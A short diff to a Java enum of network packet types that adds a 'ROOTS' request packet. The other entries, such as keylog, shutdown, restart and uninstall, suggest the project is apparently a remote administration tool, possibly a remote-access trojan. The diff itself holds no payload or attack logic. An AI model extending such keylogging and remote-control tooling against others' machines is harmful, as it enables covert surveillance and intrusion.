@@ -36,7 +36,8 @@ public enum PacketType {
 	UNINSTALL(25, UninstallPacket.class),
 	KEYLOG(26, KeylogPacket.class),
 	SHUTDOWN(27, ShutdownPacket.class),
-	RESTART(28, RestartPacket.class);
+	RESTART(28, RestartPacket.class),
+	ROOTS(29, RootRequestPacket.class);
 	
 	public final byte id;
 	public final Class<? extends IPacket> clazz;
